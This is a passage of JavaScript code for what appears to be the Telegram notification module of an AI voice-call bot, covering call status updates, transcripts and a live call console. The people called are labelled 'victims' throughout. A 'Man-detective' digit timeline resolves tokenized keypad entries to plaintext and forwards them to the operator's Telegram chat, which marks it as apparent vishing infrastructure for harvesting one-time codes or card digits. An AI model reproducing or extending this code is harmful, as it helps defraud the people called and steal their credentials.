      const shouldSendBubble = ['completed', 'failed', 'busy', 'no-answer', 'no_answer', 'canceled', 'voicemail'];
      const shouldOfferRetry = ['failed', 'busy', 'no-answer', 'voicemail'].includes(adjustedStatus);

      if (shouldSendBubble.includes(adjustedStatus)) {
        const replyMarkup = shouldOfferRetry ? this.buildRetryActions(call_sid) : null;
        await this.sendTelegramMessage(telegram_chat_id, fullMessage, false, { replyMarkup, parseMode });
        console.log(`✅ Sent enhanced status update: ${adjustedStatus} for call ${call_sid}`);
        if (this.isTerminalStatus(adjustedStatus)) {
          this.terminalStatusSent.set(call_sid, true);
        }
      } else {
        console.log(`⏭️ Console-only status ${adjustedStatus} for call ${call_sid}`);
      }
      await consolePromise;
      await this.updateLiveConsoleStatus(call_sid, adjustedStatus, telegram_chat_id, statusSource);

      if (this.isTerminalStatus(adjustedStatus)) {
        await this.flushPendingTranscript(call_sid);
      }

      // Log notification metric
      if (this.db && this.db.logNotificationMetric) {
        await this.db.logNotificationMetric(`call_${correctedStatus}`, true);
      }

      // Schedule cleanup for terminal states
      if (['completed', 'failed', 'no-answer', 'busy', 'canceled', 'voicemail'].includes(adjustedStatus)) {
        setTimeout(() => {
          this.cleanupCallData(call_sid);
        }, 5 * 60 * 1000); // Cleanup after 5 minutes
      }

      return true;
    } catch (error) {
      console.error('❌ Failed to send enhanced call status update:', error);
      
      // Log failed notification metric
      if (this.db && this.db.logNotificationMetric) {
        await this.db.logNotificationMetric(`call_${status.toLowerCase()}`, false);
      }
      
      return false;
    }
  }

  // Enhanced transcript preview with expandable full transcript
  async sendCallTranscript(call_sid, telegram_chat_id) {
    try {
      const callDetails = await this.db.getCall(call_sid);
      const transcripts = await this.db.getCallTranscripts(call_sid);
      const hasTranscriptText = (transcripts || []).some(
        (entry) => String(entry?.message || '').trim().length > 0,
      );
      let hasTranscriptAudio = Boolean(
        pickTranscriptAssetUrl(callDetails || {}, []),
      );
      if (!hasTranscriptAudio) {
        const callStates = await this.db.getCallStates(call_sid, { limit: 40 }).catch(() => []);
        hasTranscriptAudio = Boolean(pickTranscriptAssetUrl(callDetails || {}, callStates));
      }
      
      if (!callDetails || (!hasTranscriptText && !hasTranscriptAudio)) {
        await this.sendTelegramMessage(telegram_chat_id, '📋 No transcript available for this call');
        return true;
      }

      const label =
        callDetails.customer_name ||
        callDetails.victim_name ||
        callDetails.phone_number ||
        'this call';
      const message = `📋 Transcript ready for ${label}.\nChoose an option below.`;

      const replyMarkup = {
        inline_keyboard: [
          [{ text: '📄 View transcript', callback_data: `tr:${call_sid}` }],
          [{ text: '🎧 Transcript audio', callback_data: `rca:${call_sid}` }]
        ]
      };

      await this.sendTelegramMessage(telegram_chat_id, message, false, { replyMarkup });

      console.log(`✅ Sent enhanced transcript for call ${call_sid}`);
      
      // Log transcript metric
      if (this.db && this.db.logNotificationMetric) {
        await this.db.logNotificationMetric('call_transcript', true);
      }
      
      return true;
      
    } catch (error) {
      console.error('❌ Failed to send enhanced call transcript:', error);
      
      // Log failed transcript metric
      if (this.db && this.db.logNotificationMetric) {
        await this.db.logNotificationMetric('call_transcript', false);
      }
      
      try {
        await this.sendTelegramMessage(telegram_chat_id, '❌ Error retrieving call transcript');
      } catch (fallbackError) {
        console.error('Failed to send error message:', fallbackError);
      }
      
      return false;
    }
  }

  async sendCallRecap(call_sid, telegram_chat_id) {
    try {
      const callMeta = await this.getCallMeta(call_sid);
      const intro = `📋 Call recap options for ${callMeta.victimName || 'the contact'}`;
      const replyMarkup = {
        inline_keyboard: [[
          { text: '📩 Send recap via SMS', callback_data: `recap:sms:${call_sid}` },
          { text: '✋ Skip', callback_data: `recap:skip:${call_sid}` }
        ]]
      };
      await this.sendTelegramMessage(telegram_chat_id, intro, false, { replyMarkup });
      return true;
    } catch (error) {
      console.error('❌ Failed to send call recap:', error);
      try {
        await this.sendTelegramMessage(telegram_chat_id, '❌ Error sending call recap');
      } catch (fallbackError) {
        console.error('Failed to send recap error message:', fallbackError);
      }
      return false;
    }
  }

  async sendFullTranscript(call_sid, telegram_chat_id, replyToMessageId = null) {
    try {
      const callDetails = await this.db.getCall(call_sid);
      const transcripts = await this.db.getCallTranscripts(call_sid);
      const digitEvents = this.db?.getCallDigits
        ? await this.db.getCallDigits(call_sid).catch(() => [])
        : [];

      if (!callDetails || !transcripts || transcripts.length === 0) {
        await this.sendTelegramMessage(telegram_chat_id, '📋 No transcript available for this call', false, {
          replyToMessageId
        });
        return true;
      }

      let message = `📄 *Full Transcript*\n\n`;
      message += `📞 *Phone:* ${callDetails.phone_number}\n`;

      if (callDetails.duration && callDetails.duration > 0) {
        const minutes = Math.floor(callDetails.duration / 60);
        const seconds = callDetails.duration % 60;
        message += `⏱️ *Duration:* ${minutes}:${String(seconds).padStart(2, '0')}\n`;
      }

      if (callDetails.started_at && callDetails.ended_at) {
        const startTime = new Date(callDetails.started_at).toLocaleTimeString();
        message += `🕐 *Time:* ${startTime}\n`;
      }

      message += `💬 *Messages:* ${transcripts.length}\n`;
      if (this.shouldIncludeDigitSummary(digitEvents, callDetails)) {
        const digitSummary = this.buildDigitSummaryFromEvents(digitEvents);
        message += `🔢 *Man-detective:*\n${digitSummary}\n`;
        message += `\n*Digit Timeline:*\n`;
        message += `${'─'.repeat(25)}\n`;
        const renderTimelineValue = (event) => {
          const metadata = this.parseDigitEventMetadata(event);
          const eventCallSid = String(event?.call_sid || call_sid || '').trim() || null;
          const candidates = [event?.digits, metadata?.raw_digits, metadata?.secret_token_ref];
          for (const candidate of candidates) {
            const value = String(candidate || '').trim();
            if (!value) continue;
            if (value.startsWith('vault://digits/') || value.startsWith('tok_')) {
              const resolved = this.resolveDigitToken(eventCallSid, value);
              if (resolved) return resolved;
              return value;
            }
            return value;
          }
          const masked = String(metadata?.masked || '').trim();
          if (masked) return masked;
          return 'none';
        };
        digitEvents.slice(-12).forEach((event) => {
          const ts = event.created_at ? new Date(event.created_at).toLocaleTimeString() : '';
          const label = event.profile || 'digits';
          const value = renderTimelineValue(event);
          const status = event.accepted ? '✅' : '⚠️';
          message += `${status} ${label}: ${value} ${ts ? `(${ts})` : ''}\n`;
        });
        message += `\n`;
      }
      message += `\n*Conversation:*\n`;
      message += `${'─'.repeat(25)}\n`;

      for (const entry of transcripts) {
        const speaker = entry.speaker === 'user' ? '🧑 *User*' : '🤖 *AI*';
        const resolvedText = this.resolveTokenizedText(call_sid, entry.message || '');
        const cleanMessage = this.cleanMessageForTelegram(resolvedText);
        message += `${speaker}: ${cleanMessage}\n\n`;
      }

      const chunks = this.splitMessage(message, 3900);
      for (let i = 0; i < chunks.length; i++) {
        await this.sendTelegramMessage(telegram_chat_id, chunks[i], true, { replyToMessageId });
        if (i < chunks.length - 1) {
          await this.delay(1000);
        }
      }

      return true;
    } catch (error) {
      console.error('❌ Failed to send full transcript:', error);
      try {
        await this.sendTelegramMessage(telegram_chat_id, '❌ Error retrieving full transcript', false, {
          replyToMessageId
        });
      } catch (fallbackError) {
        console.error('Failed to send transcript error message:', fallbackError);
      }
      return false;
    }
  }

  // Process individual notification with enhanced error handling
  async sendNotification(notification) {
    const { id, call_sid, notification_type, telegram_chat_id, phone_number } = notification;

    try {
      let success = false;
      let shouldMarkSent = true;

      switch (notification_type) {
        case 'call_initiated':
        case 'call_queued':
          success = await this.sendCallStatusUpdate(call_sid, 'initiated', telegram_chat_id, { status_source: 'provider' });
          break;
        case 'call_ringing':
          success = await this.sendCallStatusUpdate(call_sid, 'ringing', telegram_chat_id, { status_source: 'provider' });
          break;
        case 'call_answered':
          success = await this.sendCallStatusUpdate(call_sid, 'answered', telegram_chat_id, { status_source: 'provider' });
          break;
        case 'call_in_progress':
          success = await this.sendCallStatusUpdate(call_sid, 'in-progress', telegram_chat_id, { status_source: 'provider' });
          break;
        case 'call_completed':
          const callDetails = await this.db.getCall(call_sid);
          success = await this.sendCallStatusUpdate(call_sid, 'completed', telegram_chat_id, { 
            duration: callDetails?.duration,
            status_source: 'provider'
          });
          break;
        case 'call_recap':
          // Deprecated: recap options should not be pushed in status notifications
          success = true;
          break;
        case 'call_transcript': {
          const result = await this.deferTranscriptIfNeeded(notification);
          success = result?.ok === true;
          if (result?.deferred) {
            shouldMarkSent = false;
          }
          break;
        }
        case 'call_failed':
          const failedCall = await this.db.getCall(call_sid);
          success = await this.sendCallStatusUpdate(call_sid, 'failed', telegram_chat_id, { 
            error_message: failedCall?.error_message,
            status_source: 'provider'
          });
          break;
        case 'call_busy':
          success = await this.sendCallStatusUpdate(call_sid, 'busy', telegram_chat_id, { status_source: 'provider' });
          break;
        case 'call_no_answer':
        case 'call_no-answer':
          const noAnswerCall = await this.db.getCall(call_sid);
          success = await this.sendCallStatusUpdate(call_sid, 'no-answer', telegram_chat_id, {
            ring_duration: noAnswerCall?.ring_duration,
            answered_by: noAnswerCall?.answered_by,
            voicemail_detected: this.isVoicemailAnswer(noAnswerCall?.answered_by),
            status_source: 'provider'
          });
          break;
        case 'call_voicemail': {
          const voicemailCall = await this.db.getCall(call_sid);
          success = await this.sendCallStatusUpdate(call_sid, 'no-answer', telegram_chat_id, {
            ring_duration: voicemailCall?.ring_duration,
            answered_by: voicemailCall?.answered_by || 'machine',
            voicemail_detected: true,
            status_source: 'provider'
          });
          break;
        }
        case 'call_canceled':
          success = await this.sendCallStatusUpdate(call_sid, 'canceled', telegram_chat_id, { status_source: 'provider' });
          break;
        case 'call_stream_started':
          // Informational only; mark as processed without noisy logs
          success = true;
          break;
        default:
        console.warn(`⚠️ Unknown notification type: ${notification_type}`);
          success = await this.sendCallStatusUpdate(call_sid, notification_type.replace('call_', ''), telegram_chat_id, { status_source: 'provider' });
      }

      if (success) {
        if (shouldMarkSent) {
          await this.db.updateEnhancedWebhookNotification(id, 'sent', null, null);
          console.log(`✅ Processed enhanced notification ${id} (${notification_type})`);
        } else {
          console.log(`✅ Deferred enhanced notification ${id} (${notification_type})`);
        }
      } else {
        throw new Error('Failed to send notification');
      }

    } catch (error) {
      console.error(`❌ Failed to send notification ${id}:`, error.message);
      const retryCount = Number(notification.retry_count) || 0;
      const shouldRetry = retryCount + 1 < this.retryMaxAttempts;
      const status = shouldRetry ? 'retrying' : 'failed';
      const nextAttemptAt = shouldRetry ? this.computeNextAttemptAt(retryCount) : null;
      await this.db.updateEnhancedWebhookNotification(id, status, error.message, null, {
        nextAttemptAt
      });
      
      if (!shouldRetry) {
        // For critical failures, try to send error notification to user
        if (['call_failed', 'call_transcript'].includes(notification_type)) {
          try {
            await this.sendTelegramMessage(telegram_chat_id, `❌ Error processing ${notification_type.replace('_', ' ')}`);
          } catch (errorNotificationError) {
            console.error('Failed to send error notification:', errorNotificationError);
          }
        }
      }
    }
  }

  // Enhanced Telegram message sending with markdown support
  async sendTelegramMessage(chatId, message, enableMarkdown = false, options = {}) {
    const url = `https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`;
    
    const payload = {
      chat_id: chatId,
      text: message,
      disable_web_page_preview: true
    };

    if (options.parseMode) {
      payload.parse_mode = options.parseMode;
    } else if (enableMarkdown) {
      payload.parse_mode = 'Markdown';
    }

    if (options.replyMarkup) {
      payload.reply_markup = options.replyMarkup;
    }

    if (options.replyToMessageId) {
      payload.reply_to_message_id = options.replyToMessageId;
    }

    const response = await axios.post(url, payload, {
      timeout: this.telegramRequestTimeoutMs,
      headers: {
        'Content-Type': 'application/json'
      }
    });

    if (!response.data.ok) {
      throw new Error(`Telegram API error: ${response.data.description || 'Unknown error'}`);
    }

    return response.data;
  }

  async sendTelegramAudio(chatId, audioUrl, caption = '') {
    const url = `https://api.telegram.org/bot${this.telegramBotToken}/sendAudio`;
    const payload = {
      chat_id: chatId,
      audio: audioUrl,
      caption: caption || undefined
    };
    const response = await axios.post(url, payload, {
      timeout: this.telegramRequestTimeoutMs
    });
    return response.data;
  }

  async editTelegramMessage(chatId, messageId, message, enableMarkdown = false, replyMarkup = null, options = {}) {
    const url = `https://api.telegram.org/bot${this.telegramBotToken}/editMessageText`;
    const payload = {
      chat_id: chatId,
      message_id: messageId,
      text: message,
      disable_web_page_preview: true
    };

    if (options.parseMode) {
      payload.parse_mode = options.parseMode;
    } else if (enableMarkdown) {
      payload.parse_mode = 'Markdown';
    }
    if (replyMarkup) {
      payload.reply_markup = replyMarkup;
    }

    const response = await axios.post(url, payload, {
      timeout: this.telegramRequestTimeoutMs,
      headers: {
        'Content-Type': 'application/json'
      }
    });

    if (!response.data.ok) {
      throw new Error(`Telegram API error: ${response.data.description || 'Unknown error'}`);
    }

    return response.data;
  }

  async answerCallbackQuery(callbackQueryId, message, showAlert = false) {
    if (!this.telegramBotToken || !callbackQueryId) {
      return false;
    }

    const url = `https://api.telegram.org/bot${this.telegramBotToken}/answerCallbackQuery`;
    const payload = {
      callback_query_id: callbackQueryId
    };

    if (message) {
      payload.text = String(message).slice(0, 190);
      payload.show_alert = !!showAlert;
    }

    try {
      const response = await axios.post(url, payload, { timeout: 8000 });
      return !!response.data.ok;
    } catch (error) {
      console.error('Failed to answer Telegram callback query:', error.message);
      return false;
    }
  }

  // Debug method for troubleshooting
  async sendDebugInfo(call_sid, telegram_chat_id, webhookData) {
    try {
      const debugMessage = `*Debug Info* for Call ${call_sid.slice(-6)}:
      
📊 *Status:* ${webhookData.CallStatus}
⏱️ *Duration:* ${webhookData.Duration || 'N/A'}
📱 *AnsweredBy:* ${webhookData.AnsweredBy || 'N/A'}
🔢 *CallDuration:* ${webhookData.CallDuration || 'N/A'}
📞 *DialDuration:* ${webhookData.DialCallDuration || 'N/A'}
❌ *Error:* ${webhookData.ErrorCode || 'None'}
🔗 *From:* ${webhookData.From || 'N/A'}
🎯 *To:* ${webhookData.To || 'N/A'}`;

      await this.sendTelegramMessage(telegram_chat_id, debugMessage, true);
      return true;
    } catch (error) {
      console.error('Failed to send debug info:', error);
      return false;
    }
  }

  buildProgressTracker(status) {
    const normalized = String(status || '').toLowerCase();
    const nodes = ['📡', '🔔', '📞', '☎️', '✅'];
    const statusIndex = {
      initiated: 0,
      ringing: 1,
      answered: 2,
      'in-progress': 3,
      completed: 4
    };
    const failureStops = {
      busy: 1,
      'no-answer': 1,
      voicemail: 2,
      failed: 0,
      canceled: 0
    };

    const isFailure = Object.prototype.hasOwnProperty.call(failureStops, normalized);
    if (isFailure) {
      const stopIndex = failureStops[normalized];
      const sequence = nodes.slice(0, stopIndex + 1).map((icon) => `*${icon}*`);
      sequence.push('❌');
      return `Progress\n${sequence.join(' ─ ')}`;
    }

    const activeIndex = statusIndex[normalized] ?? 0;
    const sequence = nodes.map((icon, idx) => (idx <= activeIndex ? `*${icon}*` : icon));
    return `Progress\n${sequence.join(' ─ ')}`;
  }

  buildStatusBubble(status, victimName, options = {}) {
    const normalized = String(status || '').toLowerCase();
    const name = victimName || 'the victim';
    const ringDelay = options.ringDelay || options.ringDuration;
    const durationSeconds = options.durationSeconds;
    const errorMsg = options.errorMsg;

    switch (normalized) {
      case 'initiated':
        return `📡 Connecting to ${name}…`;
      case 'ringing': {
        const delayText = ringDelay ? ` (${ringDelay}s)` : '';
        return `🔔 Ringing${delayText}`;
      }
      case 'answered':
        return `📞 ${name} picked up!`;
      case 'in-progress':
        return `☎️ You're now connected.`;
      case 'completed': {
        const durationText = durationSeconds ? ` - Duration: ${this.formatDuration(durationSeconds)}` : '';
        return `🟢 Call ended${durationText}`;
      }
      case 'voicemail': {
        const durationText = durationSeconds ? ` - Duration: ${this.formatDuration(durationSeconds)}` : '';
        return `📮 Voicemail - ${name}'s voicemail picked up${durationText}.`;
      }
      case 'busy':
        return `🚫 Busy - ${name}'s line is occupied.`;
      case 'no-answer':
      case 'no_answer': {
        const ringText = ringDelay ? ` (rang ${ringDelay}s)` : '';
        const voicemailText = options.voicemailDetected ? ' (voicemail reached)' : '';
        return `⏳ No Answer - ${name} didn't pick up${ringText}${voicemailText}.`;
      }
      case 'canceled':
        return `⚠️ Canceled - Call was canceled.`;
      case 'failed':
        return `❌ Failed - ${errorMsg || 'Something went wrong placing the call.'}`;
      default:
        return `📱 ${status} - Update for ${name}.`;
    }
  }

  // Utility methods
  getStatusEmoji(status) {
    const statusEmojis = {
      'completed': '🟢',
      'failed': '❌',
      'busy': '📵',
      'no-answer': '❌',
      'canceled': '🚫',
      'voicemail': '📮',
      'answered': '📞',
      'ringing': '🔔',
      'initiated': '📞'
    };
    return statusEmojis[status] || '📱';
  }

  cleanMessageForTelegram(message) {
    // Clean up message for better Telegram display
    return message
      .replace(/[*_`\[\]()~>#+=|{}.!-]/g, '\\$&') // Escape markdown chars
      .replace(/•/g, '') // Remove TTS markers
      .trim();
  }

  async getCallMeta(callSid, callDetails = null) {
    let details = callDetails;
    if (!details) {
      details = await this.db.getCall(callSid).catch(() => null);
    }
    let state = null;
    try {
      state = await this.db.getLatestCallState(callSid, 'call_created');
    } catch {
      state = null;
    }

    const phoneNumber = details?.phone_number || state?.phone_number || '';
    const toNumber = state?.to || state?.to_number || state?.called || state?.To || '';
    const victimName = state?.customer_name || state?.victim_name || details?.customer_name || details?.victim_name || '';
    const label = victimName || this.formatContactLabel(phoneNumber);
    const inbound = state?.inbound === true;
    let callerFlag = null;
    if (inbound && this.db?.getCallerFlag && phoneNumber) {
      const normalizedPhone = normalizePhoneForFlag(phoneNumber) || phoneNumber;
      callerFlag = await this.db.getCallerFlag(normalizedPhone).catch(() => null);
    }
    const routeLabel = inbound
      ? (state?.route_label || resolveInboundRouteLabel(toNumber, config.inbound?.routes || {}))
      : null;

    return {
      victimName: label,
      phoneNumber: phoneNumber || 'Unknown',
      toNumber: toNumber || 'Unknown',
      script: state?.script || details?.script || '—',
      routeLabel: routeLabel || null,
      inbound,
      callerFlag: callerFlag?.status || null,
      callerNote: callerFlag?.note || null
    };
  }

  async ensureLiveConsole(callSid, chatId, callMeta = null) {
    const existing = this.liveConsoleByCallSid.get(callSid);
    if (existing) return existing;
    if (!chatId) return null;

    const meta = callMeta || await this.getCallMeta(callSid);
    const initialStatus = meta.inbound
      ? `📥 Incoming call from ${meta.victimName || 'caller'}…`
      : `📡 Connecting to ${meta.victimName || 'victim'}…`;
    this.markCallActivity(callSid);
    const entry = {
      chatId,
      callSid,
      messageId: null,
      createdAt: new Date(),
      lastEditAt: null,
      pickedUpAt: null,
      endedAt: null,
      status: initialStatus,
      statusKey: meta.inbound ? 'ringing' : 'initiated',
      statusSource: 'provider',
      phase: this.getConsolePhaseLabel('waiting'),
      phaseKey: 'waiting',
      lastEvents: [],
      previewTurns: { user: '—', agent: '—' },
      victimName: meta.victimName || 'Unknown',
      inbound: meta.inbound === true,
      phoneNumber: meta.phoneNumber || 'Unknown',
      toNumber: meta.toNumber || 'Unknown',
      script: meta.script || '—',
      routeLabel: meta.routeLabel || null,
      callerFlag: meta.callerFlag || null,
      callerNote: meta.callerNote || null,
      waveformIndex: 0,
      waveformLevel: 0,
      signalLevel: null,
      jitterMs: null,
      packetLossPct: null,
      asrConfidence: null,
      latencyMs: null,
      lastWaveformLevel: null,
      sentimentFlag: '',
      compact: meta.inbound === true,
      actionsExpanded: false,
      maxEvents: meta.inbound === true ? 3 : null,
      redactPreview: meta.inbound === true
    };

    if (meta.inbound && !this.getInboundGate(callSid)) {
      this.setInboundGate(callSid, 'pending', { chatId });
    }

    const text = this.buildLiveConsoleMessage(entry);
    const escapedText = this.escapeMarkdownV2PreservingSpoilers(text);
    const initialMarkup = this.consoleButtons(callSid, entry);
    const response = await this.sendTelegramMessage(chatId, escapedText, false, {
      replyMarkup: initialMarkup,
      parseMode: 'MarkdownV2'
    });
    entry.messageId = response?.result?.message_id;
    entry.lastEditAt = new Date();
    entry.lastMessageText = text;
    entry.lastMarkup = JSON.stringify(initialMarkup || {});
    this.liveConsoleByCallSid.set(callSid, entry);
    return entry;
  }

  getConsoleStatusLabel(status, inbound = false) {
    const inboundMap = {
      initiated: '📲 Incoming',
      ringing: '🔔 Incoming…',
      answered: '📞 Connected',
      'in-progress': '☎️ Live',
      completed: '🟢 Ended',
      voicemail: '📮 Voicemail',
      'no-answer': '📵 Missed',
      busy: '🚫 Busy',
      failed: '❌ Failed',
      canceled: '⚠️ Canceled'
    };
    const outboundMap = {
      initiated: '📡 Initiated',
      ringing: '🔔 Ringing…',
      answered: '📞 Picked up',
      'in-progress': '☎️ In progress',
      completed: '🟢 Completed',
      voicemail: '📮 Voicemail',
      'no-answer': '⏳ No answer',
      busy: '🚫 Busy',
      failed: '❌ Failed',
      canceled: '⚠️ Canceled'
    };
    const map = inbound ? inboundMap : outboundMap;
    return map[status] || `📱 ${status}`;
  }

  getConsolePhaseLabel(phaseKey) {
    const map = {
      waiting: '⏳ Waiting…',
      listening: '🎙 Listening…',
      user_speaking: '🎙 User speaking…',
      thinking: '🧠 Thinking…',
      agent_responding: '🤖 Agent responding…',
      agent_speaking: '🔊 Agent speaking…',
      interrupted: '✋ Interrupted',
      ending: '👋 Ending…',
      ended: '—'
    };
    return map[phaseKey] || phaseKey || '—';
  }

  getLiveConsolePhaseKey(callSid) {
    const entry = this.liveConsoleByCallSid.get(callSid);
    return entry?.phaseKey || null;
  }

  markCallActivity(callSid) {
    if (!callSid) return;
    this.callActivityAt.set(callSid, Date.now());
  }

  shouldDeferTerminalStatus(callSid) {
    const lastActivity = this.callActivityAt.get(callSid);
    if (!lastActivity) return false;
    return Date.now() - lastActivity < this.terminalQuietMs;
  }

  scheduleDeferredTerminalStatus(callSid, status, telegramChatId, additionalData = {}) {
    if (!callSid) return;
    this.pendingTerminalStatus.set(callSid, {
      status,
      telegramChatId,
      additionalData
    });
    if (this.pendingTerminalTimers.has(callSid)) {
      return;
    }
    const timer = setTimeout(async () => {
      this.pendingTerminalTimers.delete(callSid);
      const pending = this.pendingTerminalStatus.get(callSid);
      if (!pending) return;
      this.pendingTerminalStatus.delete(callSid);
      await this.sendCallStatusUpdate(callSid, pending.status, pending.telegramChatId, {
        ...pending.additionalData,
        deferred: true
      });
    }, this.terminalQuietMs);
    this.pendingTerminalTimers.set(callSid, timer);
  }

  clampLevel(level) {
    if (!Number.isFinite(level)) return null;
    return Math.max(0, Math.min(1, level));
  }

  pickWaveformIndex(level, frames = null) {
    if (!Number.isFinite(level)) return 0;
    const list = Array.isArray(frames) && frames.length ? frames : this.waveformFrames;
    const idx = Math.round(level * (list.length - 1));
    return Math.max(0, Math.min(list.length - 1, idx));
  }

  getWaveformFramesForPhase(phaseKey) {
    switch (phaseKey) {
      case 'agent_speaking':
        return this.waveformFrames;
      case 'user_speaking':
        return this.waveformUserFrames;
      case 'listening':
        return this.waveformListeningFrames;
      case 'thinking':
      case 'agent_responding':
        return this.waveformThinkingFrames;
      case 'interrupted':
        return this.waveformInterruptedFrames;
      default:
        return null;
    }
  }

  getRawSignalLevel(entry) {
    const phaseKey = entry?.phaseKey || 'waiting';
    if (phaseKey === 'ended') return 0;
    const metrics = this.getQualityMetrics(entry);
    let level = 5;
    if (metrics.jitterMs > 20) level -= 1;
    if (metrics.latencyMs && metrics.latencyMs > 250) level -= 1;
    if (metrics.packetLossPct > 1) level -= 1;
    if (metrics.asrConfidence < 0.6) level -= 1;

    if (phaseKey === 'waiting') {
      level = Math.min(level, 2);
    } else if (phaseKey === 'ending') {
      level = Math.min(level, 3);
    }

    return Math.max(0, Math.min(this.signalBarsMax, level));
  }

  getSmoothedSignalLevel(entry, rawLevel) {
    const alpha = Number.isFinite(this.signalSmoothing) ? this.signalSmoothing : 0.35;
    const safeRaw = Math.max(0, Math.min(this.signalBarsMax, Number(rawLevel) || 0));
    const prev = Number.isFinite(entry?.signalLevel) ? entry.signalLevel : safeRaw;
    const next = prev + (safeRaw - prev) * alpha;
    entry.signalLevel = next;
    return Math.max(0, Math.min(this.signalBarsMax, Math.round(next)));
  }

  renderSignalBars(strength, max = this.signalBarsMax) {
    return buildSignalBars(strength, max, this.signalBarEmpty);
  }

  buildSignalLine(entry) {
    const phaseKey = entry?.phaseKey || 'waiting';
    const rawLevel = this.getRawSignalLevel(entry);
    const strength = this.getSmoothedSignalLevel(entry, rawLevel);
    const bars = this.renderSignalBars(Number.isFinite(strength) ? strength : 0, this.signalBarsMax);
    return `📶 ${this.signalCarrierName} ${bars}  ${this.signalNetworkLabel}`;
  }

  formatEventTimeline(events = [], limitOverride = null) {
    const cleaned = events
      .map((event) => String(event || '').trim())
      .filter(Boolean);
    const deduped = [];
    for (const item of cleaned) {
      if (!deduped.length || deduped[deduped.length - 1] !== item) {
        deduped.push(item);
      }
    }
    const limit = Number.isFinite(limitOverride) ? limitOverride : this.liveConsoleMaxEvents;
    const recent = deduped.slice(-limit);
    if (!recent.length) return ['• —'];
    return recent.map((line) => `• ${line}`);
  }

  getPhaseAccent(phaseKey) {
    const map = {
      waiting: '🟡',
      listening: '🟢',
      user_speaking: '🔵',
      thinking: '🟣',
      agent_responding: '🟣',
      agent_speaking: '🟦',
      interrupted: '🟠',
      ending: '🟠',
      ended: '⚫'
    };
    return map[phaseKey] || '🟡';
  }

  getLatencyMs(entry) {
    const override = Number(entry?.latencyMs);
    if (Number.isFinite(override)) {
      return Math.max(60, Math.min(420, override));
    }
    const phaseKey = entry?.phaseKey || 'waiting';
    if (phaseKey === 'ended') return null;
    const baseMap = {
      waiting: 210,
      listening: 130,
      user_speaking: 95,
      thinking: 180,
      agent_responding: 160,
      agent_speaking: 110,
      interrupted: 220,
      ending: 160
    };
    const base = baseMap[phaseKey] ?? 150;
    const level = Number.isFinite(entry?.waveformLevel) ? entry.waveformLevel : 0;
    const jitter = Number.isFinite(entry?.waveformIndex) ? ((entry.waveformIndex % 7) - 3) * 6 : 0;
    const levelShift = Math.round((0.55 - level) * 18);
    const value = base + jitter + levelShift;
    return Math.max(60, Math.min(420, value));
  }

  getQualityMetrics(entry) {
    const latencyMs = this.getLatencyMs(entry);
    let jitterMs = Number(entry?.jitterMs);
    if (!Number.isFinite(jitterMs)) {
      const fallback = Number.isFinite(entry?.waveformIndex)
        ? Math.abs(((entry.waveformIndex % 5) - 2) * 6)
        : 0;
      jitterMs = Math.max(0, Math.min(60, fallback));
    }
    let packetLossPct = Number(entry?.packetLossPct);
    if (!Number.isFinite(packetLossPct)) {
      packetLossPct = 0;
    }
    if (packetLossPct > 0 && packetLossPct < 1) {
      packetLossPct *= 100;
    }
    let asrConfidence = Number(entry?.asrConfidence);
    if (!Number.isFinite(asrConfidence)) {
      asrConfidence = 0.75;
    }
    return {
      latencyMs,
      jitterMs,
      packetLossPct,
      asrConfidence
    };
  }

  getQualityScore(entry) {
    const metrics = this.getQualityMetrics(entry);
    let score = 5;
    if (metrics.jitterMs > 20) score -= 1;
    if (metrics.latencyMs && metrics.latencyMs > 250) score -= 1;
    if (metrics.packetLossPct > 1) score -= 1;
    if (metrics.asrConfidence < 0.6) score -= 1;
    return Math.max(0, Math.min(5, score));
  }

  getCallQualityScore(callSid) {
    if (!callSid) return null;
    const entry = this.liveConsoleByCallSid.get(callSid);
    if (!entry) return null;
    return this.getQualityScore(entry);
  }

  formatLatencyLine(entry) {
    const latency = this.getLatencyMs(entry);
    if (!latency) return '📡 RTT —';
    return `📡 RTT ${latency}ms`;
  }

  getHealthSummary(entry) {
    const phaseKey = entry?.phaseKey || 'waiting';
    const statusText = String(entry?.status || '').toLowerCase();
    if (phaseKey === 'ended' || /completed/.test(statusText)) {
      return { emoji: '⚫', label: 'Ended', dropRisk: '—' };
    }
    if (/failed|no answer|busy|canceled|voicemail/.test(statusText)) {
      return { emoji: '🚨', label: 'Critical', dropRisk: 'High' };
    }

    const eventsText = (entry?.lastEvents || []).join(' ').toLowerCase();
    let score = 0;
    if (/error|failed|timeout|no answer|busy|canceled|voicemail/.test(eventsText)) score += 2;
    if (/retry|transfer|interrupted/.test(eventsText)) score += 1;
    if (entry?.sentimentFlag) score += 1;

    const qualityScore = this.getQualityScore(entry);
    if (qualityScore <= 1) score += 2;
    if (qualityScore <= 3) score += 1;

    if (score >= 3) return { emoji: '🚨', label: 'At risk', dropRisk: 'High' };
    if (score >= 2) return { emoji: '⚠️', label: 'Degraded', dropRisk: 'Medium' };
    return { emoji: '✅', label: 'Stable', dropRisk: 'Low' };
  }

  formatHealthLine(entry) {
    const summary = this.getHealthSummary(entry);
    return `🩺 ${summary.emoji} ${summary.label} · Drop risk: ${summary.dropRisk}`;
  }

  consoleButtons(callSid, entry) {
    if (entry?.actionLock) {
      return {
        inline_keyboard: [[{ text: `⏳ ${entry.actionLock}`, callback_data: 'noop' }]]
      };
    }
    const compactLabel = entry?.compact ? '🧭 Full view' : '🧭 Compact view';
    const privacyLabel = entry?.redactPreview ? '🔓 Reveal' : '🔒 Hide';
    if (entry?.inbound) {
      const gateStatus = this.getInboundGate(callSid)?.status || 'pending';
      const isTerminal = this.isTerminalStatus(entry?.statusKey);
      if (gateStatus !== 'answered' && !isTerminal) {
        return {
          inline_keyboard: []
        };
      }
      if (!entry.actionsExpanded) {
        return {
          inline_keyboard: [
            [
              { text: '⚙️ Actions', callback_data: `lc:actions:${callSid}` },
              { text: compactLabel, callback_data: `lc:compact:${callSid}` }
            ]
          ]
        };
      }
      return {
        inline_keyboard: [
          [
            { text: '⏺️ Record', callback_data: `lc:rec:${callSid}` },
            { text: '⏹ End', callback_data: `lc:end:${callSid}` },
            { text: '🔀 Transfer', callback_data: `lc:xfer:${callSid}` }
          ],
          [
            { text: '📩 SMS', callback_data: `lc:sms:${callSid}` },
            { text: '⏲ Callback', callback_data: `lc:callback:${callSid}` },
            { text: '⚠️ Spam', callback_data: `lc:spam:${callSid}` }
          ],
          [
            { text: '✅ Allow', callback_data: `lc:allow:${callSid}` },
            { text: '🚫 Block', callback_data: `lc:block:${callSid}` },
            { text: privacyLabel, callback_data: `lc:privacy:${callSid}` }
          ],
          [
